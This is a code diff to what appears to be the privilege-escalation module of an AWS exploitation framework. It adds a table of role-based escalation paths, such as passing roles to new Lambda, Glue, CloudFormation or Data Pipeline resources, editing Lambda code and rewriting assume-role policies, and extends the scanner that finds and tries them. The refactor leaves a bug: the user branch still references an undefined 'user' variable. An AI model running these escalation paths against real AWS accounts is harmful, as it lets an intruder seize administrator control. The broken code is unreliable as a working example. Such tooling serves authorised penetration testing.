@@ -128,7 +128,7 @@ def main(args, pacu_main):
         'datapipeline:PutPipelineDefinition'
     ]
     checked_perms = {'Allow': {}, 'Deny': {}}
-    escalation_methods = {
+    user_escalation_methods = {
         'CreateNewPolicyVersion': {
             'iam:CreatePolicyVersion': True,  # Create new policy and set it as default
             'iam:ListAttachedGroupPolicies': False,  # Search for policies belonging to the user
@@ -248,6 +248,104 @@ def main(args, pacu_main):
         }
     }
 
+    role_escalation_methods = {
+        'CreateNewPolicyVersion': {
+            'iam:CreatePolicyVersion': True,  # Create new policy and set it as default
+            'iam:ListAttachedGroupPolicies': False,  # Search for policies belonging to the user
+            'iam:ListAttachedUserPolicies': False,  # ^
+            'iam:ListAttachedRolePolicies': False,  # ^
+            'iam:ListGroupsForUser': False  # ^
+        },
+        'SetExistingDefaultPolicyVersion': {
+            'iam:SetDefaultPolicyVersion': True,  # Set a different policy version as default
+            'iam:ListPolicyVersions': False,  # Find a version to change to
+            'iam:ListAttachedGroupPolicies': False,  # Search for policies belonging to the user
+            'iam:ListAttachedUserPolicies': False,  # ^
+            'iam:ListAttachedRolePolicies': False,  # ^
+            'iam:ListGroupsForUser': False  # ^
+        },
+        'CreateEC2WithExistingIP': {
+            'iam:PassRole': True,  # Pass the instance profile/role to the EC2 instance
+            'ec2:RunInstances': True,  # Run the EC2 instance
+            'iam:ListInstanceProfiles': False  # Find an IP to pass
+        },
+        'CreateAccessKey': {
+            'iam:CreateAccessKey': True,  # Create a new access key for some user
+            'iam:ListUsers': False  # Find a user to create a key for
+        },
+        'CreateLoginProfile': {
+            'iam:CreateLoginProfile': True,  # Create a login profile for some user
+            'iam:ListUsers': False  # Find a user to create a profile for
+        },
+        'UpdateLoginProfile': {
+            'iam:UpdateLoginProfile': True,  # Update the password for an existing login profile
+            'iam:ListUsers': False  # Find a user to update the password for
+        },
+        'AttachRolePolicy': {
+            'iam:AttachRolePolicy': True,  # Attach an existing policy to a role
+            'iam:ListRoles': False  # Find a role to attach to
+        },
+        'PutRolePolicy': {
+            'iam:PutRolePolicy': True,  # Alter an existing-attached inline role policy
+            'iam:ListRolePolicies': False  # Find a roles inline policies
+        },
+        'UpdateRolePolicyToAssumeIt': {
+            'iam:UpdateAssumeRolePolicy': True,  # Update the roles AssumeRolePolicyDocument to allow the user to assume it
+            'sts:AssumeRole': True,  # Assume the newly update role
+            'iam:ListRoles': False  # Find a role to assume
+        },
+        'PassExistingRoleToNewLambdaThenInvoke': {
+            'iam:PassRole': True,  # Pass the role to the Lambda function
+            'lambda:CreateFunction': True,  # Create a new Lambda function
+            'lambda:InvokeFunction': True,  # Invoke the newly created function
+            'iam:ListRoles': False  # Find a role to pass
+        },
+        'PassExistingRoleToNewLambdaThenTriggerWithNewDynamo': {
+            'iam:PassRole': True,  # Pass the role to the Lambda function
+            'lambda:CreateFunction': True,  # Create a new Lambda function
+            'lambda:CreateEventSourceMapping': True,  # Create a trigger for the Lambda function
+            'dynamodb:CreateTable': True,  # Create a new table to use as the trigger ^
+            'dynamodb:PutItem': True,  # Put a new item into the table to trigger the trigger
+            'iam:ListRoles': False  # Find a role to pass to the function
+        },
+        'PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo': {
+            'iam:PassRole': True,  # Pass the role to the Lambda function
+            'lambda:CreateFunction': True,  # Create a new Lambda function
+            'lambda:CreateEventSourceMapping': True,  # Create a trigger for the Lambda function
+            'dynamodb:ListStreams': False,  # Find existing streams
+            'dynamodb:PutItem': False,  # Put a new item into the table to trigger the trigger
+            'dynamodb:DescribeTables': False,  # Find an existing DynamoDB table
+            'iam:ListRoles': False  # Find a role to pass to the function
+        },
+        'PassExistingRoleToNewGlueDevEndpoint': {
+            'iam:PassRole': True,  # Pass the role to the Glue Dev Endpoint
+            'glue:CreateDevEndpoint': True,  # Create the new Glue Dev Endpoint
+            'glue:GetDevEndpoint': True,  # Get the public address of it after creation
+            'iam:ListRoles': False  # Find a role to pass to the endpoint
+        },
+        'UpdateExistingGlueDevEndpoint': {
+            'glue:UpdateDevEndpoint': True,  # Update the associated SSH key for the Glue endpoint
+            'glue:DescribeDevEndpoints': False  # Find a dev endpoint to update
+        },
+        'PassExistingRoleToNewCloudFormation': {
+            'iam:PassRole': True,  # Pass role to the new stack
+            'cloudformation:CreateStack': True,  # Create the stack
+            'cloudformation:DescribeStacks': False,  # Fetch the values returned from the stack. Most likely needed, but possibly not
+            'iam:ListRoles': False  # Find roles to pass to the stack
+        },
+        'PassExistingRoleToNewDataPipeline': {
+            'iam:PassRole': True,  # Pass roles to the Pipeline
+            'datapipeline:CreatePipeline': True,  # Create the pipieline
+            'datapipeline:PutPipelineDefinition': True,  # Update the pipeline to do something
+            'iam:ListRoles': False  # List roles to pass to the pipeline
+        },
+        'EditExistingLambdaFunctionWithRole': {
+            'lambda:UpdateFunctionCode': True,  # Edit existing Lambda functions
+            'lambda:ListFunctions': True,  # Find existing Lambda functions
+            'lambda:InvokeFunction': False  # Invoke it afterwards
+        }
+    }
+
     # Check if this is an offline scan
     if args.offline is True:
         potential_methods = {}
@@ -257,46 +355,85 @@ def main(args, pacu_main):
             folder = 'sessions/{}/downloads/confirmed_permissions/'.format(session.name)
             print('No --folder argument passed to offline mode, using the default: ./{}\n'.format(folder))
             if os.path.isdir(folder) is False:
-                print('sessions/{}/downloads/confirmed_permissions/ not found! Maybe you have not run iam__enum_permissions yet...\n'.format(session.name))
-                if fetch_data(['All users permissions'], module_info['prerequisite_modules'][0], '--all-users') is False:
+                print('{} not found! Maybe you have not run {} yet...\n'.format(folder, module_info['prerequisite_modules'][0]))
+                if fetch_data(['All users/roles permissions'], module_info['prerequisite_modules'][0], '--all-users --all-roles') is False:
                     print('Pre-req module not run. Exiting...')
                     return
 
         try:
             files = os.listdir(folder)
             for file_name in files:
+                user = None
+                role = None
+
                 with open('{}{}'.format(folder, file_name), 'r') as confirmed_permissions_file:
-                    user = json.load(confirmed_permissions_file)
+                    if file_name.startswith('user-'):
+                        user = json.load(confirmed_permissions_file)
+                    elif file_name.startswith('role-'):
+                        role = json.load(confirmed_permissions_file)
 
-                if '*' in user['Permissions']['Allow'] and user['Permissions']['Allow']['*']['Resources'] == ['*']:  # If the user is already an admin, skip them
-                    print('  {} already has administrator permissions.'.format(user['UserName']))
-                    continue
+                name = '(User) {}'.format(user['UserName']) if user else '(Role) {}'.format(role['RoleName'])
 
-                potential_methods[user['UserName']] = []
+                if user:
+                    if '*' in user['Permissions']['Allow'] and user['Permissions']['Allow']['*']['Resources'] == ['*']:  # If the user is already an admin, skip them
+                        print('  {} already has administrator permissions.'.format(name))
+                        continue
 
-                for method in escalation_methods.keys():
-                    is_possible = True
+                    potential_methods[name] = []
 
-                    for permission in escalation_methods[method]:
-                        if escalation_methods[method][permission] is True:  # If the permission is required for the method
-                            if permission in user['Permissions']['Deny']:
-                                is_possible = False
-                                break
+                    for method in user_escalation_methods.keys():
+                        is_possible = True
 
-                            elif permission not in user['Permissions']['Allow']:  # and the user doesn't have it allowed
-                                wildcard_match = False
-
-                                for user_perm in user['Permissions']['Allow']:
-                                    if '*' in user_perm:
-                                        if permission.startswith(user_perm.split('*', maxsplit=1)[0]):
-                                            wildcard_match = True
-
-                                if wildcard_match is False:
+                        for permission in user_escalation_methods[method]:
+                            if user_escalation_methods[method][permission] is True:  # If the permission is required for the method
+                                if permission in user['Permissions']['Deny']:
                                     is_possible = False
                                     break
 
-                    if is_possible is True:
-                        potential_methods[user['UserName']].append(method)
+                                elif permission not in user['Permissions']['Allow']:  # and the user doesn't have it allowed
+                                    wildcard_match = False
+
+                                    for user_perm in user['Permissions']['Allow']:
+                                        if '*' in user_perm:
+                                            if permission.startswith(user_perm.split('*', maxsplit=1)[0]):
+                                                wildcard_match = True
+
+                                    if wildcard_match is False:
+                                        is_possible = False
+                                        break
+
+                        if is_possible is True:
+                            potential_methods[name].append(method)
+                elif role:
+                    if '*' in role['Permissions']['Allow'] and role['Permissions']['Allow']['*']['Resources'] == ['*']:  # If the role is already an admin, skip them
+                        print('  {} already has administrator permissions.'.format(name))
+                        continue
+
+                    potential_methods[name] = []
+
+                    for method in role_escalation_methods.keys():
+                        is_possible = True
+
+                        for permission in role_escalation_methods[method]:
+                            if role_escalation_methods[method][permission] is True:  # If the permission is required for the method
+                                if permission in role['Permissions']['Deny']:
+                                    is_possible = False
+                                    break
+
+                                elif permission not in role['Permissions']['Allow']:  # and the role doesn't have it allowed
+                                    wildcard_match = False
+
+                                    for role_perm in role['Permissions']['Allow']:
+                                        if '*' in role_perm:
+                                            if permission.startswith(role_perm.split('*', maxsplit=1)[0]):
+                                                wildcard_match = True
+
+                                    if wildcard_match is False:
+                                        is_possible = False
+                                        break
+
+                        if is_possible is True:
+                            potential_methods[name].append(method)
 
             potential_methods = remove_empty_from_dict(potential_methods)
             print(potential_methods)
@@ -305,8 +442,11 @@ def main(args, pacu_main):
             with open('sessions/{}/downloads/offline_privesc_scan_{}.json'.format(session.name, now), 'w+') as scan_results_file:
                 json.dump(potential_methods, scan_results_file, indent=2, default=str)
 
-            print('Completed offline privesc_scan of directory ./{}. Results stored in ./sessions/{}/downloads/offline_privesc_scan_{}.json'.format(folder, session.name, now))
-            return
+            summary_data['offline'] = {
+                'scanned_dir': folder,
+                'output_file': './sessions/{}/downloads/offline_privesc_scan_{}.json'.format(session.name, now)
+            }
+            return summary_data
 
         except Exception as e:
             print('Error accessing folder {}: {}\nExiting...'.format(folder, e))
@@ -314,33 +454,33 @@ def main(args, pacu_main):
 
     # It is online if it has reached here
 
-    user = key_info()
+    target = key_info()
 
     # Preliminary check to see if these permissions have already been enumerated in this session
-    if 'Permissions' in user and 'Allow' in user['Permissions']:
+    if 'Permissions' in target and 'Allow' in target['Permissions']:
         # Have any permissions been enumerated?
-        if user['Permissions']['Allow'] == {} and user['Permissions']['Deny'] == {}:
+        if target['Permissions']['Allow'] == {} and target['Permissions']['Deny'] == {}:
             print('No permissions detected yet.')
-            if fetch_data(['User', 'Permissions'], module_info['prerequisite_modules'][0], '') is False:
+            if fetch_data(['Current User/Role', 'Permissions'], module_info['prerequisite_modules'][0], '') is False:
                 print('Pre-req module not run successfully. Exiting...')
                 return
-            user = key_info()
+            target = key_info()
 
         # Are they an admin already?
-        if '*' in user['Permissions']['Allow'] and user['Permissions']['Allow']['*']['Resources'] == ['*']:
+        if '*' in target['Permissions']['Allow'] and target['Permissions']['Allow']['*']['Resources'] == ['*']:
             print('You already have admin permissions (Action: * on Resource: *)! Exiting...')
             return
 
         for perm in all_perms:
             for effect in ['Allow', 'Deny']:
-                if perm in user['Permissions'][effect]:
-                    checked_perms[effect][perm] = user['Permissions'][effect][perm]
+                if perm in target['Permissions'][effect]:
+                    checked_perms[effect][perm] = target['Permissions'][effect][perm]
                 else:
-                    for user_perm in user['Permissions'][effect].keys():
-                        if '*' in user_perm:
-                            pattern = re.compile(user_perm.replace('*', '.*'))
+                    for target_perm in target['Permissions'][effect].keys():
+                        if '*' in target_perm:
+                            pattern = re.compile(target_perm.replace('*', '.*'))
                             if pattern.search(perm) is not None:
-                                checked_perms[effect][perm] = user['Permissions'][effect][user_perm]
+                                checked_perms[effect][perm] = target['Permissions'][effect][target_perm]
 
     checked_methods = {
         'Potential': [],
@@ -348,35 +488,69 @@ def main(args, pacu_main):
     }
 
     # Ditch each escalation method that has been confirmed not to be possible
-    for method in escalation_methods.keys():
-        potential = True
-        confirmed = True
 
-        for perm in escalation_methods[method]:
-            if escalation_methods[method][perm] is True:  # If this permission is required
-                if 'PermissionsConfirmed' in user and user['PermissionsConfirmed'] is True:  # If permissions are confirmed
-                    if perm not in checked_perms['Allow']:  # If this permission isn't Allowed, then this method won't work
-                        potential = confirmed = False
-                        break
-                    elif perm in checked_perms['Deny'] and perm in checked_perms['Allow']:  # Permission is both Denied and Allowed, leave as potential, not confirmed
-                        confirmed = False
+    if target['UserName']:  # If they are a user
+        print('Escalation methods for current user:')
+        for method in user_escalation_methods.keys():
+            potential = True
+            confirmed = True
 
-                else:
-                    if perm in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it is Allowed and Denied, leave as potential, not confirmed
-                        confirmed = False
-                    elif perm not in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it isn't Allowed and IS Denied
-                        potential = confirmed = False
-                        break
-                    elif perm not in checked_perms['Allow'] and perm not in checked_perms['Deny']:  # If its not Allowed and not Denied
-                        confirmed = False
+            for perm in user_escalation_methods[method]:
+                if user_escalation_methods[method][perm] is True:  # If this permission is required
+                    if 'PermissionsConfirmed' in user and user['PermissionsConfirmed'] is True:  # If permissions are confirmed
+                        if perm not in checked_perms['Allow']:  # If this permission isn't Allowed, then this method won't work
+                            potential = confirmed = False
+                            break
+                        elif perm in checked_perms['Deny'] and perm in checked_perms['Allow']:  # Permission is both Denied and Allowed, leave as potential, not confirmed
+                            confirmed = False
 
-        if confirmed is True:
-            print('CONFIRMED: {}\n'.format(method))
-            checked_methods['Confirmed'].append(method)
+                    else:
+                        if perm in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it is Allowed and Denied, leave as potential, not confirmed
+                            confirmed = False
+                        elif perm not in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it isn't Allowed and IS Denied
+                            potential = confirmed = False
+                            break
+                        elif perm not in checked_perms['Allow'] and perm not in checked_perms['Deny']:  # If its not Allowed and not Denied
+                            confirmed = False
 
-        elif potential is True:
-            print('POTENTIAL: {}\n'.format(method))
-            checked_methods['Potential'].append(method)
+            if confirmed is True:
+                print('  CONFIRMED: {}'.format(method))
+                checked_methods['Confirmed'].append(method)
+
+            elif potential is True:
+                print('  POTENTIAL: {}'.format(method))
+                checked_methods['Potential'].append(method)
+    elif target['RoleName']:
+        print('Escalation methods for current role:')
+        for method in role_escalation_methods.keys():
+            potential = True
+            confirmed = True
+
+            for perm in role_escalation_methods[method]:
+                if role_escalation_methods[method][perm] is True:  # If this permission is required
+                    if 'PermissionsConfirmed' in target and target['PermissionsConfirmed'] is True:  # If permissions are confirmed
+                        if perm not in checked_perms['Allow']:  # If this permission isn't Allowed, then this method won't work
+                            potential = confirmed = False
+                            break
+                        elif perm in checked_perms['Deny'] and perm in checked_perms['Allow']:  # Permission is both Denied and Allowed, leave as potential, not confirmed
+                            confirmed = False
+
+                    else:
+                        if perm in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it is Allowed and Denied, leave as potential, not confirmed
+                            confirmed = False
+                        elif perm not in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it isn't Allowed and IS Denied
+                            potential = confirmed = False
+                            break
+                        elif perm not in checked_perms['Allow'] and perm not in checked_perms['Deny']:  # If its not Allowed and not Denied
+                            confirmed = False
+
+            if confirmed is True:
+                print('  CONFIRMED: {}'.format(method))
+                checked_methods['Confirmed'].append(method)
+
+            elif potential is True:
+                print('  POTENTIAL: {}'.format(method))
+                checked_methods['Potential'].append(method)
 
     # If --scan-only wasn't passed in and there is at least one Confirmed or Potential method to try
     if args.scan_only is False and (len(checked_methods['Confirmed']) > 0 or len(checked_methods['Potential']) > 0):
@@ -418,15 +592,18 @@ def main(args, pacu_main):
                 print('No potential privilege escalation methods worked.')
         summary_data['success'] = escalated
     elif len(checked_methods['Confirmed']) == 0 and len(checked_methods['Potential']) == 0:
-        print('No privilege escalation paths found.')
+        print('  None found')
         summary_data['success'] = False
 
     return summary_data
 
 
 def summary(data, pacu_main):
+    print()
     if data['scan_only']:
         return '  Scan Complete'
+    elif 'offline' in data and data['offline']:
+        return '  Completed offline scan of:\n    ./{}\n\n  Results stored in:\n    {}'.format(data['offline']['scanned_dir'], data['offline']['output_file'])
     else:
         if 'success' in data and data['success']:
             out = '  Privilege escalation was successful'
@@ -436,8 +613,8 @@ def summary(data, pacu_main):
 
 
 # Functions for individual privesc methods
-# Their names match their key names under the escalation_methods object so I can invoke a method by running globals()[method]()
-# Each of these will return True if successful and False is failed
+# Their names match their key names under the user_escalation_methods/role_escalation_methods objects so I can invoke a method by running globals()[method]()
+# Each of these will return True if successful and False if failed
 
 def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
@@ -639,7 +816,7 @@ def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
                 PolicyArn=policy_arn
             )
             versions = response['Versions']
-            while 'IsTruncated' in response and response['IsTruncated'] is True:
+            while response.get('IsTruncated'):
                 response = client.list_policy_versions(
                     PolicyArn=policy_arn,
                     Marker=response['Marker']
@@ -669,7 +846,7 @@ def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
             print('Version: {}\n'.format(version['VersionId']))
 
         print(version_document)
-        print('')
+        print()
     new_version = input('What version would you like to switch to (example: v1)? Just press enter to keep it as the default: ')
     if not new_version:
         print('  Keeping the default version as is.\n')
@@ -739,7 +916,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
 
     response = client.list_instance_profiles()
     instance_profiles = response['InstanceProfiles']
-    while 'IsTruncated' in response and response['IsTruncated'] is True:
+    while response.get('IsTruncated'):
         response = client.list_instance_profiles(
             Marker=response['Marker']
         )
